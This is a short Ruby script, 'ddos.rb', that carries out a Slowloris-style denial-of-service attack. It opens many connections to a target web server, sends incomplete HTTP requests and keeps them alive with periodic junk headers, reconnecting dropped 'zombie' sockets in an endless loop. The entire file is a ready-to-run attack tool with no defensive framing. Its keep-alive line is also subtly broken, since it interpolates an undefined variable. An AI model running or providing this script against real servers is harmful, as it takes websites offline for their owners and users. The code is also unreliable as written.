require "socket"

def init_socket(target)
  #socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
  socket = Socket.new(:INET, :STREAM)
  socket_address = Socket.pack_sockaddr_in(80, target)
  socket.connect(socket_address)

  socket.write(("GET /?%{n} HTTP/1.1\r\n" % { n: $prng.rand(2000) }).encode("utf-8"))
  
  # headers
  $regular_headers.each { |h|
    socket.write("#{h}\r\n".encode("utf-8"))
  }
  
  return socket
end

def main
  target = ARGV[0]
  socket_count = ARGV[1].to_i
  
  puts("Attacking #{target} with #{socket_count} sockets.")
  
  # Zombies time
  puts("Creating zombies packages...")
  for i in (1..socket_count)
    begin
      puts("Using zombie  \##{i} ...")
      s = init_socket(target)
    rescue
      break;
    end
    $sockets << s
  end
  
  while true
    puts("Sending to #{target} with #{$sockets.size} zombies")
    $sockets.each { |s|
      begin
        s.write(("X-a: #{n}\r\n" % { n: $prng.rand(4999)+1 }).encode("utf-8"))
      rescue
        $sockets.delete(s)
      end            
    }
    
    for i in (1..(socket_count - $sockets.size))
      puts("Reconnecting zombies")
      begin
        s = init_socket(target)
        $sockets << s if s
      rescue
        break
      end      
    end
    
    sleep(10)
  end
end

$namefile = 'ddos.rb'
$prng = Random.new(1234)
$sockets = []
$regular_headers = [
  "User-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:36.0) Gecko/20100101 Firefox/36.0.4",
  "Accept-language: en-US,en,q=0.5"
]

main()

